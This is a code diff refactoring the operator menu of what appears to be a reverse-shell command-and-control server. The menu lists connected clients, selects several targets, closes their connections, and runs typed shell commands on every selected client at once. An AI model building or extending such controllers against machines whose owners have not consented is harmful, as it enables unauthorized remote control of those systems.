@@ -1,3 +1,5 @@
+import time
+
 import server_folder.config as config
 from socket import error as socket_error
 
@@ -5,34 +7,47 @@ from socket import error as socket_error
 class Menu:
     def __init__(self, server):
         self.server = server
-        self.targets = [] # Will be filled by the tick-boxes in the GUI
+        self.targets = []  # Will be filled by the tick-boxes in the GUI
 
     def help(self):
         print('Available commands are:\n'
               '[*] list   -   Show the list of connected clients.\n'
               '[*] select -   Select a client from the list to operate commands on.\n'
-              '[*] quit   -   Stop operating on the selected client.\n'
+              '[*] quit   -   Deselect a client.\n'
               '[*] kill   -   Release a connection of a client.\n'
               '[*] shell  -   Get reverse shell access to the client.\n')
 
-    def client_list(self):
+    def refresh_client_list(self):
         # Deletes invalid connections
         print('--------Clients--------\n')
-        for i, conn in enumerate(config.all_connections):
+        for i, item in enumerate(config.all_connections):
             try:
-                conn.send(str.encode(' '))
-                conn.recv(config.BUFFER_SIZE)
+                item['data']['socket'].send(str.encode(' '))
+                item['data']['socket'].recv(config.BUFFER_SIZE)
             except socket_error:
                 config.all_connections.pop(i)
-                config.all_addresses.pop(i)
                 continue
-            print('{} |   {}    {}'.format(i, config.all_addresses[i][0], config.all_addresses[i][1]))
+            print('{} |   {}'.format(i, config.all_connections[i]['ip']))
         print('\n')
+
+    def kill(self):
+        """ Disconnects a client """
+        for target in self.targets:
+            try:
+                config.all_connections[target]['data']['socket'].close()
+                print('[*] Successfully closed connection (not killed) ', config.all_connections[target]['ip'], '\n')
+                config.all_connections.pop(target)
+                self.quit(target)
+            except socket_error:
+                print('[!] Failed to kill client\n')
 
     def select(self, target):
         try:
-            self.targets.append(target)
-            print('[*] You are now connected to ', config.all_addresses[target])
+            if target not in self.targets:
+                self.targets.append(target)
+                print('[*] You are now connected to ', config.all_connections[target]['ip'])
+            else:
+                print('Already targeting')
         except socket_error:
             print('[!] Invalid selection')
             self.quit()
@@ -44,21 +59,10 @@ class Menu:
         else:
             self.targets.pop(target)
 
-    def kill(self):
-        for target in self.targets:
-            try:
-                config.all_connections[target].close()
-                print('[*] Successfully killed ', config.all_addresses[target], '\n')
-                config.all_connections.pop(target)
-                config.all_addresses.pop(target)
-                self.quit(target)
-            except socket_error:
-                print('[!] Failed to kill client\n')
-
     def shell(self):
         config.custom_console = 'shell> '
         for target in self.targets:
-            conn = config.all_connections[target]
+            conn = config.all_connections[target]['data']['socket']
             self.server.send(conn, 'shell')
 
         stop_flag = False
@@ -67,17 +71,17 @@ class Menu:
             for target in self.targets:
                 print('target: ', target)
                 try:
-                    conn = config.all_connections[target]
+                    conn = config.all_connections[target]['data']['socket']
                     if cmd.lower() == 'quit':
                         self.server.send(conn, 'quit')
                         stop_flag = True
                         break
                     self.server.send(conn, cmd)
                     received = self.server.receive(conn).split('>', 1)
-                    print(received)  # Received shell data
+                    print(received[1])  # Received shell data
                 except socket_error:
                     print('[!] Connection was lost..')
+                    config.all_connections.pop(target)  # Delete dead client from the list
                     self.quit(target)
-
 
         config.custom_console = 'oSys> '
